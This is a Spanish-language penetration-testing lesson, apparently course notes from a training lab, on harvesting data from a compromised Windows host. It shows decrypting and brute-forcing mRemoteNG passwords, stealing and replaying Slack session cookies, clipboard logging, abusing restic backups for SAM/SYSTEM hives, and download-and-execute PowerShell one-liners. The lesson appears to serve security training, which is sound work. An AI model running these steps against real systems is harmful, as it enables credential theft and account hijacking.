
# Pillaging

El pillaging es el proceso de obtener información de un sistema comprometido. Puede tratarse de información personal, planos corporativos, datos de tarjetas de crédito, información del servidor, detalles de la infraestructura y la red, contraseñas u otros tipos de credenciales, y cualquier cosa relevante para la empresa o la evaluación de seguridad en la que estamos trabajando.

Estos puntos de datos pueden ayudar a obtener más acceso a la red o a completar los objetivos definidos durante el proceso previo a la prueba de penetración. Estos datos se pueden almacenar en varias aplicaciones, servicios y tipos de dispositivos, por lo que es posible que necesitemos herramientas específicas para extraerlos.

***

## <mark style="color:purple;">Fuentes de datos</mark>

A continuación se muestran algunas de las fuentes de las que podemos obtener información de los sistemas comprometidos:

* Aplicaciones instaladas
* Servicios instalados
  * Sitios web
  * Recursos compartidos de archivos
  * Bases de datos
  * Servicios de directorio (como Active Directory, Azure AD, etc.)
  * Servidores de nombres
  * Servicios de implementación
  * Autoridad de certificación
  * Servidor de gestión de código fuente
  * Virtualización
  * Mensajería
  * Sistemas de Monitoreo y Registro
  * Copias de seguridad
* Datos sensibles
  * Registro de claves o contraseñas
  * Captura de pantalla
  * Captura de tráfico de red
  * Informes de auditorías anteriores
* Información del usuario
  * Archivos históricos, documentos interesantes (.doc/x, .xls/x, password./pass *.* , etc.)
  * Roles y privilegios
  * Navegadores web
  * Clientes de mensajería instantánea

Esta no es una lista completa. Cualquier cosa que pueda proporcionar información sobre nuestro objetivo será valiosa. Dependiendo del tamaño, el propósito y el alcance de la empresa, podemos encontrar información diferente. El conocimiento y la familiaridad con las aplicaciones, el software de servidor y el middleware de uso común son esenciales, ya que la mayoría de las aplicaciones almacenan sus datos en varios formatos y ubicaciones. Es posible que se necesiten herramientas especiales para obtener, extraer o leer los datos objetivo de algunos sistemas.

Durante las siguientes secciones, discutiremos y practicaremos algunos aspectos del Pillaging en Windows.

***

## <mark style="color:purple;">Escenario</mark>

Supongamos que hemos logrado establecernos en el servidor Windows mencionado en la red a continuación y comenzamos a recopilar la mayor cantidad de información posible.

![](https://academy.hackthebox.com/storage/modules/67/network.png)

***

## <mark style="color:purple;">Aplicaciones instaladas</mark>

Comprender qué aplicaciones están instaladas en nuestro sistema comprometido puede ayudarnos a lograr nuestro objetivo durante una prueba de penetración. Es importante saber que cada prueba de penetración es diferente. Podemos encontrar muchas aplicaciones desconocidas en los sistemas que comprometimos. Aprender y comprender cómo se conectan estas aplicaciones a la empresa es esencial para lograr nuestro objetivo.

También encontraremos aplicaciones típicas como Office, sistemas de gestión remota, clientes de mensajería instantánea, etc. Podemos utilizar `dir` o `ls` para comprobar el contenido de `Program Files` y `Program Files (x86)`saber qué aplicaciones están instaladas. Aunque puede que haya otras aplicaciones en el ordenador, esta es una forma rápida de revisarlas.

#### **Identificación de aplicaciones comunes**

```powershell
C:\> dir "C:\Program Files"
 Volume in drive C has no label.
 Volume Serial Number is 900E-A7ED

 Directory of C:\Program Files

07/14/2022  08:31 PM    <DIR>          .
07/14/2022  08:31 PM    <DIR>          ..
05/16/2022  03:57 PM    <DIR>          Adobe
05/16/2022  12:33 PM    <DIR>          Corsair
05/16/2022  10:17 AM    <DIR>          Google
05/16/2022  11:07 AM    <DIR>          Microsoft Office 15
07/10/2022  11:30 AM    <DIR>          mRemoteNG
07/13/2022  09:14 AM    <DIR>          OpenVPN
07/19/2022  09:04 PM    <DIR>          Streamlabs OBS
07/20/2022  07:06 AM    <DIR>          TeamViewer
               0 File(s)              0 bytes
              16 Dir(s)  351,524,651,008 bytes free
```

Una alternativa es utilizar PowerShell y leer el registro de Windows para recopilar información más granular sobre los programas instalados.

#### **Obtener programas instalados a través de PowerShell y claves de registro**

```powershell
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

DisplayName                                         DisplayVersion    InstallLocation
-----------                                         --------------    ---------------
Adobe Acrobat DC (64-bit)                           22.001.20169      C:\Program Files\Adobe\Acrobat DC\
CORSAIR iCUE 4 Software                             4.23.137          C:\Program Files\Corsair\CORSAIR iCUE 4 Software
Google Chrome                                       103.0.5060.134    C:\Program Files\Google\Chrome\Application
Google Drive                                        60.0.2.0          C:\Program Files\Google\Drive File Stream\60.0.2.0\GoogleDriveFS.exe
Microsoft Office Profesional Plus 2016 - es-es      16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
Microsoft Office Professional Plus 2016 - en-us     16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
mRemoteNG                                           1.62              C:\Program Files\mRemoteNG
TeamViewer                                          15.31.5           C:\Program Files\TeamViewer
...SNIP...
```

Podemos ver que el software `mRemoteNG` está instalado en el sistema. [mRemoteNG](https://mremoteng.org/) es una herramienta que se utiliza para administrar y conectarse a sistemas remotos mediante VNC, RDP, SSH y protocolos similares. Echemos un vistazo a `mRemoteNG`.

### **mRemoteNG**

`mRemoteNG` guarda la información de conexión y las credenciales en un archivo llamado `confCons.xml`. Utilizan una contraseña maestra codificada, `mR3m`, por lo que si alguien comienza a guardar las credenciales en `mRemoteNG` y no protege la configuración con una contraseña, podemos acceder a las credenciales desde el archivo de configuración y descifrarlas.

De forma predeterminada, el archivo de configuración se encuentra en `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`.

#### **Archivos de configuración de mRemoteNG**

```powershell
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG

    Directory: C:\Users\julio\AppData\Roaming\mRemoteNG

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/21/2022   8:51 AM                Themes
-a----        7/21/2022   8:51 AM            340 confCons.xml
              7/21/2022   8:51 AM            970 mRemoteNG.log
```

Veamos el contenido del archivo `confCons.xml`.

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```

Este documento XML contiene un elemento raíz llamado `Connections` con la información sobre el cifrado utilizado para las credenciales y el atributo `Protected`, que corresponde a la contraseña maestra utilizada para cifrar el documento. Podemos utilizar esta cadena para intentar descifrar la contraseña maestra. Encontraremos algunos elementos nombrados dentro del elemento raíz `Node`. Esos nodos contienen detalles sobre el sistema remoto, como el nombre de usuario, el dominio, el nombre de host, el protocolo y la contraseña. Todos los campos son texto sin formato excepto la contraseña, que está cifrada con la contraseña maestra.

Como se mencionó anteriormente, si el usuario no estableció una contraseña maestra personalizada, podemos usar el script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) para descifrar la contraseña. Necesitamos copiar el contenido del atributo `Password` y usarlo con la opción `-s`. Si hay una contraseña maestra y la conocemos, podemos usar la opción `-p` con la contraseña maestra personalizada para descifrar también la contraseña.

#### **Descifrar la contraseña con mremoteng\_decrypt**

```shell-session
afsh4ck@kali$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 

Password: ASDki230kasd09fk233aDA
```

Ahora veamos un archivo de configuración cifrado con una contraseña personalizada. Para este ejemplo, configuramos la contraseña personalizada `admin`.

#### **Archivo de configuración de mRemoteNG: confCons.xml**

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="1ZR9DpX3eXumopcnjhTQ7e78u+SXqyxDmv2jebJg09pg55kBFW+wK1e5bvsRshxuZ7yvteMgmfMW5eUzU4NG" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="False" 
    
<SNIP>
</Connections>
```

#### **Intentar descifrar la contraseña con una contraseña personalizada**

Si intentamos descifrar el atributo `Password` del nodo `RDP_Domain`, obtendremos el siguiente error.

```shell-session
afsh4ck@kali$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA=="

Traceback (most recent call last):
  File "/home/plaintext/htb/academy/mremoteng_decrypt.py", line 49, in <module>
    main()
  File "/home/plaintext/htb/academy/mremoteng_decrypt.py", line 45, in main
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", line 567, in decrypt_and_verify
    self.verify(received_mac_tag)
  File "/usr/lib/python3/dist-packages/Cryptodome/Cipher/_mode_gcm.py", line 508, in verify
    raise ValueError("MAC check failed")
ValueError: MAC check failed
```

Si usamos la contraseña personalizada, podremos descifrarla.

#### **Descifrar la contraseña con mremoteng\_decrypt y una contraseña personalizada**

```shell-session
afsh4ck@kali$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin

Password: ASDki230kasd09fk233aDA
```

En caso de que queramos intentar descifrar la contraseña, podemos modificar el script para probar varias contraseñas de un archivo, o podemos crear un Bash `for loop`. Podemos intentar descifrar el atributo `Protected` o el mismo `Password`. Si intentamos descifrar el atributo `Protected` una vez que encontramos la contraseña correcta, el resultado será `Password: ThisIsProtected`. Si intentamos descifrar el `Password`directamente, el resultado será `Password: <PASSWORD>`.

#### **Bucle For para descifrar la contraseña maestra con mremoteng\_decrypt**

```shell-session
afsh4ck@kali$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done    
                              
Spring2017
Spring2016
admin
Password: ASDki230kasd09fk233aDA
admin admin          
admins

<SNIP>
```

***

## <mark style="color:purple;">Abuso de cookies para obtener acceso a clientes de mensajería instantánea</mark>

Con la capacidad de enviar mensajes instantáneamente entre compañeros de trabajo y equipos, las aplicaciones de mensajería instantánea (MI) como `Slack` y `Microsoft Teams` se han convertido en elementos básicos de las comunicaciones de oficina modernas. Estas aplicaciones ayudan a mejorar la colaboración entre compañeros de trabajo y equipos. Si comprometemos una cuenta de usuario y obtenemos acceso a un cliente de mensajería instantánea, podemos buscar información en chats y grupos privados.

Hay múltiples opciones para obtener acceso a un cliente de mensajería instantánea; un método estándar es utilizar las credenciales del usuario para ingresar a la versión en la nube de la aplicación de mensajería instantánea como lo haría un usuario normal.

Si el usuario utiliza alguna forma de autenticación multifactor, o no podemos obtener las credenciales de texto simple del usuario, podemos intentar robar las cookies del usuario para iniciar sesión en el cliente basado en la nube.

A menudo existen herramientas que pueden ayudarnos a automatizar el proceso, pero como la nube y las aplicaciones evolucionan constantemente, es posible que estas aplicaciones queden obsoletas y que aún tengamos que encontrar una forma de recopilar información de los clientes de mensajería instantánea. Comprender cómo abusar de las credenciales, las cookies y los tokens suele ser útil para acceder a aplicaciones web como los clientes de mensajería instantánea.

Tomemos `Slack`como ejemplo varias publicaciones que hacen referencia a cómo abusar de Slack `Slack`, como [Abusar de Slack para operaciones ofensivas](https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282) y [Suplantación de identidad para obtener tokens de Slack](https://thomfre.dev/post/2021/phishing-for-slack-tokens/) . Podemos usarlas para comprender mejor cómo funcionan los tokens y las cookies de Slack, pero tenga en cuenta que el `Slack's`comportamiento puede haber cambiado desde la publicación de esas publicaciones.

También existe una herramienta llamada [SlackExtract](https://github.com/clr2of8/SlackExtract) , lanzada en 2018, que fue capaz de extraer `Slack`mensajes. Su investigación analiza la cookie denominada `d`, que `Slack`se utiliza para almacenar el token de autenticación del usuario. Si podemos conseguir esa cookie, podremos autenticarnos como el usuario. En lugar de utilizar la herramienta, intentaremos obtener la cookie de Firefox o de un navegador basado en Chromium y autenticarnos como el usuario.

### **Extracción de cookies de Firefox**

Firefox guarda las cookies en una base de datos SQLite en un archivo llamado `cookies.sqlite`. Este archivo se encuentra en el directorio APPDATA de cada usuario `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`. Hay una parte del archivo que es aleatoria y podemos usar un comodín en PowerShell para copiar el contenido del archivo.

#### **Copiar la base de datos de cookies de Firefox**

```powershell
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

Podemos copiar el archivo a nuestra máquina y usar el script de Python [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) para extraer cookies de la base de datos `cookies.SQLite` de Firefox.

#### **Extraer la cookie de Slack de la base de datos de cookies de Firefox**

```shell-session
afsh4ck@kali$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
```

Ahora que tenemos la cookie, podemos usar cualquier extensión del navegador para agregarla a nuestro navegador. Para este ejemplo, usaremos Firefox y la extensión [Cookie-Editor](https://cookie-editor.cgagnier.ca/) . Asegúrese de instalar la extensión haciendo clic en el enlace, seleccionando su navegador y agregando la extensión. Una vez que la extensión esté instalada, verá algo como esto:

![texto](https://academy.hackthebox.com/storage/modules/67/cookie-editor-extension.jpg)

Nuestro sitio web de destino es `slack.com`. Ahora que tenemos la cookie, queremos suplantar al usuario. Naveguemos a slack.com una vez que se cargue la página, hagamos clic en el ícono de la extensión Cookie-Editor y modifiquemos el valor de la cookie `d` con el valor que tenga del script `cookieextractor.py`. Asegúrese de hacer clic en el ícono de guardar (marcado en rojo en la imagen a continuación).

![texto](https://academy.hackthebox.com/storage/modules/67/replace-cookie.jpg)

Una vez que hayas guardado la cookie, puedes actualizar la página y ver que has iniciado sesión como usuario.

![texto](https://academy.hackthebox.com/storage/modules/67/cookie-access.jpg)

Ahora hemos iniciado sesión como usuario y podemos hacer clic en `Launch Slack`. Es posible que nos soliciten credenciales u otro tipo de información de autenticación; podemos repetir el proceso anterior y reemplazar la cookie `d` con el mismo valor que usamos para acceder la primera vez en cualquier sitio web que nos solicite información o credenciales.

![texto](https://academy.hackthebox.com/storage/modules/67/replace-cookie2.jpg)

Una vez que completemos este proceso para cada sitio web donde recibamos un mensaje, debemos actualizar el navegador, hacer clic en `Launch Slack` y usarlo en el navegador.

Después de obtener acceso, podemos usar funciones integradas para buscar palabras comunes como contraseñas, credenciales, PII o cualquier otra información relevante para nuestra evaluación.

![texto](https://academy.hackthebox.com/storage/modules/67/search-creds-slack.jpg)

### **Extracción de cookies de navegadores basados ​​en Chromium**

El navegador basado en Chromium también almacena la información de sus cookies en una base de datos SQLite. La única diferencia es que el valor de la cookie está encriptado con [la API de protección de datos (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) . `DPAPI`Se utiliza comúnmente para encriptar datos utilizando información de la cuenta o computadora del usuario actual.

Para obtener el valor de la cookie, necesitaremos realizar una rutina de descifrado desde la sesión del usuario que hemos comprometido. Afortunadamente, una herramienta llamada [SharpChromium](https://github.com/djhohnstein/SharpChromium) hace lo que necesitamos. Se conecta a la base de datos de cookies SQLite del usuario actual, descifra el valor de la cookie y presenta el resultado en formato JSON.

Usemos [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1) , un script de PowerShell creado por [S3cur3Th1sSh1t](https://twitter.com/ShitSecure) que usa reflexión para cargar SharpChromium.

#### **Script de PowerShell: Invoke-SharpChromium**

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

[X] Exception: Could not find file 'C:\Users\lab_admin\AppData\Local\Google\Chrome\User Data\\Default\Cookies'.

   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
   at System.IO.File.InternalCopy(String sourceFileName, String destFileName, Boolean overwrite, Boolean checkout)
   at Utils.FileUtils.CreateTempDuplicateFile(String filePath)
   at SharpChromium.ChromiumCredentialManager.GetCookies()
   at SharpChromium.Program.extract data(String path, String browser)
[*] Finished Google Chrome extraction.

[*] Done.
```

Recibimos un error porque la ruta del archivo de cookies que contiene la base de datos está codificada en [SharpChromium](https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47) y la versión actual de Chrome utiliza una ubicación diferente.

Podemos modificar el código `SharpChromium` o copiar el archivo cookie en el lugar donde SharpChromium lo esté buscando.

`SharpChromium` está buscando un archivo en `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies`, pero el archivo real se encuentra en `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies`, con el siguiente comando copiaremos el archivo a la ubicación que SharpChromium espera.

#### **Copiar cookies a SharpChromium Ubicación esperada**

```powershell
PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

Ahora podemos usar Invoke-SharpChromium nuevamente para obtener una lista de cookies en formato JSON.

#### **Extracción de cookies de Invoke-SharpChromium**

```powershell
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

--- Chromium Cookie (User: lab_admin) ---
Domain         : slack.com
Cookies (JSON) :
[

<SNIP>

{
    "domain": ".slack.com",
    "expirationDate": 1974643257.67155,
    "hostOnly": false,
    "httpOnly": true,
    "name": "d",
    "path": "/",
    "sameSite": "lax",
    "secure": true,
    "session": false,
    "storeId": null,
    "value": "xoxd-5KK4K2RK2ZLs2sISUEBGUTxLO0dRD8y1wr0Mvst%2Bm7Vy24yiEC3NnxQra8uw6IYh2Q9prDawms%2FG72og092YE0URsfXzxHizC2OAGyzmIzh2j1JoMZNdoOaI9DpJ1Dlqrv8rORsOoRW4hnygmdR59w9Kl%2BLzXQshYIM4hJZgPktT0WOrXV83hNeTYg%3D%3D"
},
{
    "domain": ".slack.com",
    "hostOnly": false,
    "httpOnly": true,
    "name": "d-s",
    "path": "/",
    "sameSite": "lax",
    "secure": true,
    "session": true,
    "storeId": null,
    "value": "1659023172"
},

<SNIP>

]

[*] Finished Google Chrome extraction.

[*] Done.
```

Ahora podemos utilizar esta cookie con el editor de cookies como lo hicimos con Firefox.

Nota: al copiar y pegar el contenido de una cookie, asegúrese de que el valor sea una línea.

***

## <mark style="color:purple;">Clipboard</mark>

En muchas empresas, los administradores de red utilizan gestores de contraseñas para almacenar sus credenciales y copiar y pegar contraseñas en formularios de inicio de sesión. Como esto no implica `escribir` las contraseñas, el registro de pulsaciones de teclas no es eficaz en este caso. Este `clipboard` proporciona acceso a una cantidad significativa de información, como el pegado de credenciales y tokens de software 2FA, así como la posibilidad de interactuar directamente con el portapapeles de la sesión RDP.

Podemos utilizar el script [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1) para extraer los datos del portapapeles del usuario. Inicie el registrador ejecutando el siguiente comando.

#### **Supervisar el portapapeles con PowerShell**

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
PS C:\htb> Invoke-ClipboardLogger
```

El script comenzará a monitorear las entradas en el portapapeles y las presentará en la sesión de PowerShell. Debemos ser pacientes y esperar hasta que capturemos información confidencial.

#### **Capturar credenciales con Invoke-ClipboardLogger**

```powershell
PS C:\htb> Invoke-ClipboardLogger

https://portal.azure.com

Administrator@something.com

Sup9rC0mpl2xPa$$ws0921lk
```

{% hint style="success" %}
**Nota**: Las credenciales de usuario se pueden obtener con herramientas como Mimikatz o un keylogger. Los frameworks C2 como Metasploit con Meterpreter contienen funciones integradas para keylogger.
{% endhint %}

***

## <mark style="color:purple;">Roles y servicios</mark>

Los servicios de un host en particular pueden prestar servicios al propio host o a otros hosts de la red de destino. Es necesario crear un perfil de cada host de destino, documentando la configuración de estos servicios, su finalidad y cómo podemos utilizarlos potencialmente para alcanzar nuestros objetivos de evaluación. Las funciones y servicios típicos del servidor incluyen:

* Servidores de archivos e impresión
* Servidores web y de bases de datos
* Servidores de autoridad de certificación
* Servidores de gestión de código fuente
* Servidores de respaldo

Tomemos `Backup Servers` como ejemplo, si comprometemos un servidor o host con un sistema de backup, podemos comprometer la red.

## **Ataque a servidores de Backup**

En tecnología de la información, un `backup` (o copia de seguridad) es una copia de datos informáticos que se toma y se almacena en otro lugar para que pueda utilizarse para restaurar el original después de un evento de pérdida de datos. Las copias de seguridad se pueden utilizar para recuperar datos después de una pérdida debido a la eliminación o corrupción de datos o para recuperar datos de un momento anterior. Las copias de seguridad proporcionan una forma sencilla de recuperación ante desastres. Algunos sistemas de copia de seguridad pueden reconstruir un sistema informático u otras configuraciones complejas, como un servidor de Active Directory o un servidor de base de datos.

Por lo general, los sistemas de respaldo necesitan una cuenta para conectarse a la máquina de destino y realizar la copia de seguridad. La mayoría de las empresas requieren que las cuentas de respaldo tengan privilegios administrativos locales en la máquina de destino para acceder a todos sus archivos y servicios.

Si obtenemos acceso a un `sistema de backup`, podremos revisar copias de seguridad, buscar hosts interesantes y restaurar los datos que queramos.

Como ya comentamos anteriormente, buscamos información que nos ayude a movernos lateralmente en la red o a aumentar nuestros privilegios. Tomemos como ejemplo [a Restic](https://restic.net/). `Restic` es un programa de copia de seguridad moderno que puede realizar copias de seguridad de archivos en Linux, BSD, Mac y Windows.

Para empezar a trabajar con `restic`, debemos crear un `repositorio`(el directorio donde se almacenarán los backups). `Restic` comprueba si la variable de entorno `RESTIC_PASSWORD` está configurada y utiliza su contenido como contraseña para el repositorio. Si esta variable no está configurada, solicitará la contraseña para inicializar el repositorio y para cualquier otra operación en este repositorio.

Usaremos `restic 0.13.1` y respaldaremos el repositorio `C:\xampp\htdocs\webapp` en el directorio `E:\restic\`. Para descargar la última versión de restic, visite <https://github.com/restic/restic/releases/latest> . En nuestra máquina de destino, restic se encuentra en `C:\Windows\System32\restic.exe`.

Primero debemos crear e inicializar la ubicación donde se guardará nuestra copia de seguridad, llamada `repository`.

#### **Restic - Inicializar directorio de respaldo**

```powershell
PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init

    Directory: E:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/9/2022   2:16 PM                restic2
enter password for new repository:
enter password again:
created restic repository fdb2e6dd1d at E:\restic2

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```

Luego podremos crear nuestra primera copia de seguridad.

#### **Restic - Realizar una copia de seguridad de un directorio**

```powershell
PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder

repository fdb2e6dd opened successfully, password is correct
created new cache in C:\Users\jeff\AppData\Local\restic
no parent snapshot found, will read all files

Files:           1 new,     0 changed,     0 unmodified
Dirs:            2 new,     0 changed,     0 unmodified
Added to the repo: 927 B

processed 1 files, 22 B in 0:00
snapshot 9971e881 saved
```

Si queremos realizar un respaldo de un directorio como por ejemplo `C:\Windows`, que tiene algunos archivos utilizados activamente por el sistema operativo, podemos utilizar la opción `--use-fs-snapshot` para crear un VSS (Volume Shadow Copy) para realizar el respaldo.

#### **Restic - Realizar una copia de seguridad de un directorio con VSS**

```powershell
PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

repository fdb2e6dd opened successfully, password is correct
no parent snapshot found, will read all files
creating VSS snapshot for [c:\]
successfully created snapshot for [c:\]
error: Open: open \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config: Access is denied.

Files:           0 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repo: 914 B

processed 0 files, 0 B in 0:02
snapshot b0b6f4bb saved
Warning: at least one source file could not be read
```

{% hint style="warning" %}
**Nota**: Si el usuario no tiene los derechos para acceder o copiar el contenido de un directorio, es posible que aparezca un mensaje de Acceso denegado. Se creará la copia de seguridad, pero no se encontrará ningún contenido.
{% endhint %}

También podemos comprobar qué copias de seguridad están guardadas en el repositorio mediante el comando `snapshot`.

#### **Restic - Verificar copias de seguridad guardadas en un repositorio**

```powershell
PS C:\htb> restic.exe -r E:\restic2\ snapshots

repository fdb2e6dd opened successfully, password is correct
ID        Time                 Host             Tags        Paths
--------------------------------------------------------------------------------------
9971e881  2022-08-09 14:18:59  PILLAGING-WIN01              C:\SampleFolder
b0b6f4bb  2022-08-09 14:19:41  PILLAGING-WIN01              C:\Windows\System32\config
afba3e9c  2022-08-09 14:35:25  PILLAGING-WIN01              C:\Users\jeff\Documents
--------------------------------------------------------------------------------------
3 snapshots
```

Podemos restaurar una copia de seguridad utilizando el ID.

#### **Restic - Restaurar una copia de seguridad con ID**

```powershell
PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore

repository fdb2e6dd opened successfully, password is correct
restoring <Snapshot 9971e881 of [C:\SampleFolder] at 2022-08-09 14:18:59.4715994 -0700 PDT by PILLAGING-WIN01\jeff@PILLAGING-WIN01> to C:\Restore
```

Si navegamos hasta `C:\Restore`, encontraremos la estructura de directorios donde se realizó la copia de seguridad. Para llegar al directorio `SampleFolder`, debemos navegar hasta `C:\Restore\C\SampleFolder`.

Necesitamos entender nuestros objetivos y qué tipo de información estamos buscando. Si encontramos una copia de seguridad de una máquina Linux, es posible que queramos revisar archivos como `/etc/shadow`, credenciales de usuario, archivos de configuración web, directorios `.ssh` para buscar claves SSH, etc.

Si nuestro objetivo es realizar una copia de seguridad de Windows, es posible que queramos buscar el subárbol SAM & SYSTEM para extraer los hashes de las cuentas locales. También podemos identificar los directorios de aplicaciones web y los archivos comunes donde se almacenan las credenciales o la información confidencial, como los archivos web.config. Nuestro objetivo es buscar cualquier archivo interesante que pueda ayudarnos a lograr nuestro objetivo.

{% hint style="info" %}
**Nota**: restic funciona de manera similar en Linux. Si no sabemos dónde se guardan los snapshots de restic, podemos buscar en el sistema de archivos un directorio llamado snapshots. Tenga en cuenta que es posible que la variable de entorno no esté configurada. Si ese es el caso, necesitaremos proporcionar una contraseña para restaurar los archivos.
{% endhint %}

Existen cientos de aplicaciones y métodos para realizar copias de seguridad, y no podemos detallar cada uno de ellos. Este caso de `restic` es un ejemplo de cómo podría funcionar una aplicación de copias de seguridad. Otros sistemas gestionarán una consola centralizada y repositorios especiales para guardar la información de las copias de seguridad y ejecutar las tareas de copia de seguridad.

A medida que avanzamos, encontraremos diferentes sistemas de respaldo, y recomendamos tomarnos el tiempo para comprender cómo funcionan para que eventualmente podamos abusar de sus funciones para nuestro propósito.

***

## <mark style="color:purple;">Conclusión</mark>

Aún existen muchas ubicaciones, aplicaciones y métodos para obtener información interesante de un host objetivo o una red comprometida. Podemos encontrar información en servicios en la nube, dispositivos de red, IoT, etc. Sea abierto y creativo para explorar su objetivo y su red y obtenga la información que necesita utilizando sus métodos y experiencia.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.43.43

RDP con el usuario “Peter” y contraseña “Bambi123”
```

### Pregunta 1

> Acceda a la máquina de destino con las credenciales de Peter y verifique qué aplicaciones están instaladas. ¿Qué aplicación está instalada y se utiliza para administrar y conectarse a sistemas remotos?

#### Obtener programas instalados con Powershell

```powershell
PS C:\Users\Peter> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayN
